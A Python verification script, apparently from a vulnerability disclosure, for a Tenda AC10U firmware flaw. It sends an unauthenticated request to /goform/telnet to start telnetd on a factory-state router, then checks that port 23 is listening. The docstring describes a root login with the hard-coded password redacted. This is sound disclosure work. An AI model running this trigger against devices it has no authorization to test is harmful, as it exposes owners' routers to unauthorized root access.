#!/usr/bin/env python3
"""
C-3 sanitized verification -- Tenda AC10U V1.0 V15.03.06.48.

Steps
-----
1. GET /goform/telnet   -> unauthenticated telnetd activation in factory state
2. probe TCP 23         -> confirm the daemon is listening

What this script does NOT do
----------------------------
- no credential is embedded, guessed, or transmitted
- no login is attempted
- no command is executed on the device

Preconditions
-------------
- Device in factory/reset state: `sys.userpass` is empty, so
  R7WebsSecurityHandler@0x434e80 serves /goform/telnet without a session.
- TCP 23 is reachable from the tester.

Usage
-----
    python3 verify_c3.py <device-ip> [--http-port 80] [--telnet-port 23]

Expected result
---------------
    [1] HTTP request accepted
    [2] TCP <device>:23 LISTEN

Manual step (not automated, credential redacted)
------------------------------------------------
    telnet <device-ip> 23
    login:    root
    password: <redacted: shipped hard-coded credential, disclosed to CNA/vendor>
    ~ # id
    uid=0(root) gid=0(root)
"""

from __future__ import annotations

import argparse
import socket
import sys
import time
from urllib.request import urlopen

DEFAULT_HTTP_PORT = 80
DEFAULT_TELNET_PORT = 23


def trigger_telnet(host: str, port: int = DEFAULT_HTTP_PORT,
                   timeout: float = 5.0) -> None:
    url = f"http://{host}:{port}/goform/telnet"
    print(f"[1] GET {url}")
    try:
        with urlopen(url, timeout=timeout) as resp:
            print(f"    HTTP {resp.status}")
    except Exception as exc:  # noqa: BLE001 - report and continue to port check
        print(f"    [!] request failed: {exc}")
        print("    (telnetd may already be running; continuing with port check)")


def probe_telnet(host: str, port: int = DEFAULT_TELNET_PORT,
                 timeout: float = 10.0) -> bool:
    print(f"[2] TCP {host}:{port}")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=2.0) as sock:
                sock.settimeout(2.0)
                try:
                    banner = sock.recv(256)
                except socket.timeout:
                    banner = b""
                print(f"    LISTEN (banner: {banner[:80]!r})")
                return True
        except OSError:
            time.sleep(0.5)
    print("    not listening")
    return False


def main() -> int:
    parser = argparse.ArgumentParser(
        description="C-3 sanitized verification (no credentials included)")
    parser.add_argument("host", help="device IP address")
    parser.add_argument("--http-port", type=int, default=DEFAULT_HTTP_PORT)
    parser.add_argument("--telnet-port", type=int, default=DEFAULT_TELNET_PORT)
    args = parser.parse_args()

    print("[*] Precondition: factory/reset state, sys.userpass empty")
    trigger_telnet(args.host, args.http_port)
    listening = probe_telnet(args.host, args.telnet_port)

    print()
    if listening:
        print("[*] telnetd is listening. Manual login step is not automated;")
        print("    the shipped credential is redacted and disclosed to the CNA.")
        print("    Expected privilege after login: uid=0(root)")
        return 0
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
